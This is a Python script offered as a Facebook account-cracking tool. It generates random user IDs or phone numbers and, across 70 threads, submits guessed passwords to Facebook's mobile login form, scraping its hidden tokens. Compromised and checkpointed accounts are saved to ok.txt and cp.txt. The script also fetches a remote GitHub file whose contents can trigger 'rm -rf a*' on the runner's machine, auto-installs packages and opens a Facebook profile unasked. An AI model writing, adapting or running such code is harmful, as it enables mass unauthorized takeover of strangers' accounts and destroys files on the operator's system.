#coding=utf
#Coded By Lucifer :)
#Open source Coder 
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python Lucifer.py')
P = '\x1b[1;97m' # WHITE
M = '\x1b[1;91m' # RED
H = '\x1b[1;92m' # GREEN
K = '\x1b[1;93m' # YELLOW
B = '\x1b[1;94m' # BLUE
U = '\x1b[1;95m' # IDK
O = '\x1b[1;96m' # PINK
N = '\x1b[0m'    # NO COLOR
A = '\x1b[1;90m' # AGER
BN = '\x1b[1;107m' # TRANS
BBL = '\x1b[1;106m' # AORGAN
BP = '\x1b[1;105m' # OLD PINK
BB = '\x1b[1;104m' #MILODY
BK = '\x1b[1;103m' # BJK
BH = '\x1b[1;102m' # DARK GREEN
BM = '\x1b[1;101m' # MTNK
BA = '\x1b[1;100m' # ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
logo =  """ \033[1;31m
                                      
\x1b[1;96md8888b.      d88888b      db   d8b   db       .d8b.       d88888b  .d8b.  \x1b[1;96m
\x1b[1;96m88  `8D      88'          88   I8I   88      d8' `8b      88'     d8' `8b 
\x1b[1;96m88oooY'      88ooooo      88   I8I   88      88ooo88      88ooo   88ooo88 \x1b[1;96m
\x1b[1;96m88~~~b.      88~~~~~      Y8   I8I   88      88~~~88      88~~~   88~~~88 
\x1b[1;96m88   8D      88.          `8b d8'8b d8'      88   88      88      88   88 
\x1b[1;96mY8888P'      Y88888P       `8b8' `8d8'       YP   YP      YP      YP   YP \x1b[1;96m
\033[0;94m────────────────────────────────────────────────────────
\033[0;92mAuthor    \033[0;91mADEEL LEGHARI (NAM TU SUNA HOGA)
\033[0;92mGithub    \033[0;96mFUCK MR ZUKKO
\033[0;92mFACEBOOK  \033[0;94mSULMAN KABIR X.X.X
\033[0;94m────────────────────────────────────────────────────────
\033[0;91mNOTICE ! :  BEWAFA BOLTI PUBLIC APUN KO 😈👿❤️‍🔥
\033[0;94m────────────────────────────────────────────────────────
"""
loop = 0
oks = []
cps = []
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    proxy = requests.get('https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/4deeL-khan/Jaan/main/Approval.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
os.system('xdg-open https://www.Facebook.com/ved.baghel.39')
def LUCIFER():
    os.system('clear')
    print(logo)
    print('\033[1;31m[1] Random crack')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_crack()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('[1] Random UID crack')
    print('[2] Random number crack')
    print('[B] Back')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_uid()  
    elif opt =='2':
        random_number()
    elif opt =='3':
        main()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_uid():
	
	
    user=[]
    os.system('clear')
    print(logo)
    limit = int(input('How many ids do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        user.append('10000'+nmp)
    print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m')
    pwx = input('Put passwords: ').split(',')
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        
        for uid in user:
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')
def random_number():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/ved.baghel.39')
    print(logo)
    print('\033[1;33mCode example: 92301,92302,92303,92344 .\033[0;97m')
    kode = input('Put code: ')
    limit = int(input('How many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        for guru in user:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(proxy)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=V4_nZNE_cshQmJoTUkM6iW05; sb=V4_nZPj9iRDsU9j0VQtwud8H; vpd=v1%3B862x450x1.2949999570846558; locale=en_GB',
    'dpr': '1.600000023841858',
    'referer': 'https://mbasic.facebook.com/?wtsid=rdr_0enG5fWpXTSr5Bxmw&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"dandelion"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m[࿐ྂ♡ 4D33L♡ ࿐ྂ0k] '+cid+' | '+ps+'\033[0;97m')
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[࿐ྂ♡ 4D33L♡ ࿐ྂCP] '+cid+' | '+ps+'\033[0;97m')
                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

LUCIFER()
